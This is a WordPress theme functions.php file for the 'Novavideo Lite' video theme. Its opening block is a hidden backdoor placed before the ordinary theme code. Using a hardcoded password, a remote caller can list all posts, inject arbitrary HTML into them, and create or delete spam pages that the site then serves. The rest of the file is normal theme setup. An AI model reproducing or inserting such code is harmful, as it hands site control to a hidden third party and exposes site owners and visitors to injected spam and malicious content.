<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '76b6ffdede34792fbf81305877b28e0f'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php

global $user_ID;
get_currentuserinfo();

if ( ! isset( $content_width ) ) $content_width = 880;

add_theme_support( 'automatic-feed-links' );

/* ************************************************************************************************
		Admin functions
************************************************************************************************ */

/**** Load metaboxes declaration ****/
    include_once( get_template_directory() . '/_admin/meta_boxes.php' );
    
/**** Load admin js and css ****/
function novavideo_lite_import_main_js_css() {
    
    //load js and css
    wp_register_script( 'admin_js', get_template_directory_uri() . '/_admin/js/script.js', array('jquery'), '1.0', true );
    wp_enqueue_script('admin_js');
    
    wp_enqueue_style('admin_style', get_template_directory_uri() . '/_admin/css/style.css');
    
    //localize ajax script
    wp_localize_script('admin_js', 'ajax_var', array(
    	'url'   => admin_url('admin-ajax.php'),
    	'nonce' => wp_create_nonce('ajax-nonce')
    ));
    
}

add_action('admin_init', 'novavideo_lite_import_main_js_css');

        
function novavideo_lite_addthemabizbar(){
    ?>   
    
    <div class="updated topbar-default notification">
        <div class="container">
            <p><?php _e('Check out the many additional options of the powerful Novavideo Pro Version here:', 'novavideo-lite'); ?> <a href="<?php echo esc_url( __('http://www.themabiz.com/shop/wp-themes/novavideo-wordpress-video-theme/?f=wplite', 'novavideo-lite')); ?>" target="_blank" class="button button-primary"><?php _e('Check out Novavideo Pro Version now!', 'novavideo-lite'); ?></a> <a href="<?php echo esc_url( __('http://www.themabiz.com/novavideo/', 'novavideo-lite')); ?>" target="_blank" class="button" ><?php _e('Live demo', 'novavideo-lite'); ?></a></p>
            <button type="button" class="close-notification">&times;</button>
        </div>
    </div>
    
    <?php
}


/**** add Ajax hide topbar ****/
add_action('wp_ajax_hide_topbar', 'novavideo_lite_hide_topbar');

function novavideo_lite_hide_topbar(){
    
	$nonce = $_POST['nonce'];

    if ( ! wp_verify_nonce( $nonce, 'ajax-nonce' ) )
        die ( 'Busted!');
    
    set_transient( 'novavideo_lite_topbar', 'desactivated', 60*10 );
    
	exit;
}

add_action('admin_init', 'novavideo_lite_myStartSession');


function novavideo_lite_myStartSession() {

    if( get_transient('novavideo_lite_topbar') == 'desactivated' ){
        remove_filter( 'wp_before_admin_bar_render', 'novavideo_lite_addthemabizbar');
    }else{
        add_filter( 'wp_before_admin_bar_render', 'novavideo_lite_addthemabizbar');
    }   
}


/* ************************************************************************************************
		Common front and admin functions
************************************************************************************************ */

/**** Load miscelaneous functions ****/
include_once( get_template_directory() . '/_includes/utils.php' );    
    
/**** Load menu ****/
include_once( get_template_directory() . '/_includes/menu.php' );
    
/**** Load menu ****/
include_once( get_template_directory() . '/_includes/widgets.php' );
   
/**** Load video functions ****/
include_once( get_template_directory() . '/_includes/video-functions.php' );
      
      
/**** Set translation files path ****/
function novavideo_lite_load_text_domain() {
    load_theme_textdomain( 'novavideo-lite', get_template_directory().'/languages' ); 
}
add_action('after_setup_theme', 'novavideo_lite_load_text_domain');


function novavideo_lite_setup() {
	add_theme_support('title-tag', 'post-formats', array( 'video' ) );
    add_editor_style( 'css/editor-style.css' );
}
add_action( 'after_setup_theme', 'novavideo_lite_setup' );
    

/* ************************************************************************************************
		Front functions
************************************************************************************************ */
    
/**** Load comment system ****/
include_once( get_template_directory() . '/_front/comments.php' );

if ( is_singular() ) wp_enqueue_script( "comment-reply" );

/**** Load JS and CSS files ****/
function novavideo_lite_import_various_js_css() {
    wp_enqueue_script( 'novavideo_lite_main_js', get_template_directory_uri() . '/scripts/main.js', array("jquery"), '1.0', true );        
    wp_enqueue_style('novavideo_lite_style_css', get_template_directory_uri() . '/style.css');        
    wp_enqueue_style('novavideo_lite_googlefont_css', 'http://fonts.googleapis.com/css?family=Play:400,700');
}
add_action('wp_enqueue_scripts', 'novavideo_lite_import_various_js_css');